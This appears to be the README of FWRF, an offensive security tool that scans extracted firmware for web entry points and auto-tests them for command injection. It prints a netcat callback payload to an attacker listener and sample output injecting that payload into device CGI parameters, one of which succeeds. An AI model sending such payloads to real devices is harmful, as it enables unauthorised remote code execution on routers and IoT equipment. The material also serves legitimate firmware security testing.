# Firmware Web Rce Finder

FWRF (don't try to pronounce it) is a open source tool for firmware web-side analysis.

## Why FWRF ?

Due to some stupids minds, the new trend is to put computers in everything.
This poc was initially written for testing some wifi antennas firmware.

The only common element between linux-embedded stuff with web interface is the front side (html/js), the rest can be PHP (ubiquiti), ELF (netgear), some_new_hype_technology... Doesn't matter.

The Goal of FWRF is to find entrypoints, vulnerabilities and try to autosploit them.

## How ?
FWRF is composed of 4 parts:
 * File scan : Scan all files in extracted-firmware direcctory
 * Entrypoint scan : extracts urls with args, forms, etc.
 * Check rce : try basic code execution via thoses parameters
 * Test server : Start a test server for manual search

## Rce checking
 * A server is started attacker-side (listening to port 10020) and waiting for a tcp packet.
 * the payload sent to {insert here a hype-connected-device name} is `echo\t1|nc\tattacker_ip\t10020`
 * in case of a dumb code (ex: `exec("/bin/do_stuff --foobar $parameter")` with controlled parameter, the packet is sent to attacker and FWRF know the attack success.

## How to start
 * Get the awesome tool Binwalk (http://binwalk.org/) and extract the firmware.bin
 * mount/extract partition (sasquatch is great for this : https://github.com/devttys0/sasquatch)
 * launch FWRF
 * profit

## Usage
```
usage: main.py [-h] [-s] [-f BASE_FOLDER] [-r REMOTE_ADDRESS]
               [-l LOCAL_ADDRESS] [-c COOKIES] [-v]

Firmware web rce finder

optional arguments:
  -h, --help            show this help message and exit
  -s, --server          run test server only for manual tests
  -f BASE_FOLDER, --folder BASE_FOLDER
                        base folder of the extracted firmware
  -r REMOTE_ADDRESS, --remote REMOTE_ADDRESS
                        Address of live machine (like 192.168.0.1)
  -l LOCAL_ADDRESS, --local LOCAL_ADDRESS
                        Address of this machine (like 192.168.0.1)
  -c COOKIES, --cookies COOKIES
                        Use cookies for authenticated parts
  -v, --verbose         Verbose mode
```

 * -s : start the test server, waiting for a tcp packet on port 10020
 * -f : path to the extracted firmware partition
 * -r : remote connected-stuff ip
 * -l : attacker ip (used in payload generation)
 * -c : cookies, if remote interface need authentication ("foo=bar&baz=gu")
 * -v : show more stuff

## No magic exploitation

FWRF is not magic, it will only trigger obvious rce.
But if you want to search further, it can help. First, use -f and -v parameters, the full list of entry points, parameters and http method is returned. Then, start the test server and search by yourself using the provided payload (or anything sending tcp packet on 10020).

## Example
(Real mode have nice colored output)
```
~/p/firmware_web_rce_finder ❯❯❯ python ./FWRF.py -f /tmp/firmware_to_analyse.bin.extracted/squashfs-root/ -v -r 192.168.0.11 -l 192.168.0.10
 --- Firmware web rce finder ---
Search files
Search input
Clean inputs
- (GET) http://192.168.0.11/jsl10n.cgi : l={PAYLOAD}&v={PAYLOAD}&staif={PAYLOAD}&staid={PAYLOAD}
- (POST) http://192.168.0.11/ticket.cgi : uri={PAYLOAD}&ticketid={PAYLOAD}&submit={PAYLOAD}
- (POST) http://192.168.0.11/login.cgi : uri={PAYLOAD}&username={PAYLOAD}&password={PAYLOAD}&lang_changed={PAYLOAD}
- (POST) http://192.168.0.11/traceroute_action.cgi : dst_host={PAYLOAD}&resolve={PAYLOAD}&action={PAYLOAD}&tr_start={PAYLOAD}
Run tests :
- FAIL : (GET) http://192.168.0.11/jsl10n.cgi : l=%60echo%091%7Cnc%09192.168.0.10%0910020%60&v=%60echo%091%7Cnc%09192.168.0.10%0910020%60&staif=%60echo%091%7Cnc%09192.168.0.10%0910020%60&staid=%60echo%091%7Cnc%09192.168.0.10%0910020%60
- FAIL : (POST) http://192.168.0.11/ticket.cgi : uri=%60echo%091%7Cnc%09192.168.0.10%0910020%60&ticketid=%60echo%091%7Cnc%09192.168.0.10%0910020%60&submit=%60echo%091%7Cnc%09192.168.0.10%0910020%60
- FAIL : (POST) http://192.168.0.11/login.cgi : uri=%60echo%091%7Cnc%09192.168.0.10%0910020%60&username=%60echo%091%7Cnc%09192.168.0.10%0910020%60&password=%60echo%091%7Cnc%09192.168.0.10%0910020%60&lang_changed=%60echo%091%7Cnc%09192.168.0.10%0910020%60
- SUCCESS : (POST) http://192.168.0.11/traceroute_action.cgi : dst_host=%60echo%091%7Cnc%09192.168.0.10%0910020%60&resolve=%60echo%091%7Cnc%09192.168.0.10%0910020%60&action=%60echo%091%7Cnc%09192.168.0.10%0910020%60&tr_start=%60echo%091%7Cnc%09192.168.0.10%0910020%60
Finish
```

## License
```
/*
 * ----------------------------------------------------------------------------
 * "THE BEER-WARE LICENSE" (Revision 42):
 * Ganapati wrote this file. As long as you retain this notice you
 * can do whatever you want with this stuff. If we meet some day, and you think
 * this stuff is worth it, you can buy me a beer in return.
 * ----------------------------------------------------------------------------
 */
```
